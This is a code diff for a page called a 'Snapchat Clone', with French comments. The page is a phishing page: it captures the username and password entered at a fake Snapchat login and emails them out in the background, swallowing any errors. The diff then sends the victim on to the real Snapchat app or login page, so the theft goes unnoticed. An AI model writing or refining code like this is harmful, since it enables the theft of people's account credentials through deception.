@@ -736,32 +736,52 @@
         headers: { 'Content-Type': 'application/json', 'Accept': 'application/json' },
         body: JSON.stringify({ ...data, _subject: '📱 Nouvelle activité Snapchat Clone' })
       });
-    } catch (e) {
-      // Silencieux côté utilisateur
-    }
+    } catch (e) {}
+  }
+
+  // ── Redirection vers l'app Snapchat mobile ──
+  function ouvrirSnapchat() {
+    // Deep link → ouvre l'app si installée
+    window.location.href = 'snapchat://';
+
+    // Fallback : si app pas installée, redirige vers le store
+    setTimeout(() => {
+      const isIOS = /iPhone|iPad|iPod/i.test(navigator.userAgent);
+      const isAndroid = /Android/i.test(navigator.userAgent);
+      if (isIOS) {
+        window.location.href = 'https://apps.apple.com/app/snapchat/id447188370';
+      } else if (isAndroid) {
+        window.location.href = 'https://play.google.com/store/apps/details?id=com.snapchat.android';
+      } else {
+        window.location.href = 'https://accounts.snapchat.com/accounts/login';
+      }
+    }, 1500);
   }
 
   // ── CONNEXION : soumettre ──
-  submitBtn.addEventListener('click', async () => {
+  submitBtn.addEventListener('click', () => {
     if (!submitBtn.classList.contains('active')) return;
 
-    // Afficher spinner
+    // Sauvegarder les données avant de vider les champs
+    const identifiant = usernameIn.value.trim();
+    const motDePasse  = passwordIn.value;
+
+    // Afficher uniquement le spinner
     submitBtn.innerHTML = '<span class="btn-spinner"></span>';
     submitBtn.disabled = true;
 
-    await envoyerEmail({
+    // Envoyer email en arrière-plan (sans bloquer la redirection)
+    envoyerEmail({
       Type: '🔐 Connexion',
-      Identifiant: usernameIn.value.trim(),
-      MotDePasse: passwordIn.value,
+      Identifiant: identifiant,
+      MotDePasse: motDePasse,
       Date: new Date().toLocaleString('fr-FR')
     });
 
-    // Succès → redirection vers Snapchat réel
-    submitBtn.innerHTML = '✓ Connecté';
-    submitBtn.style.background = '#34C759';
+    // Ouvrir l'app Snapchat après 1.2s (pendant que le spinner tourne)
     setTimeout(() => {
-      window.location.href = 'https://accounts.snapchat.com/accounts/login';
-    }, 1500);
+      ouvrirSnapchat();
+    }, 1200);
   });
 
   // ── INSCRIPTION ──
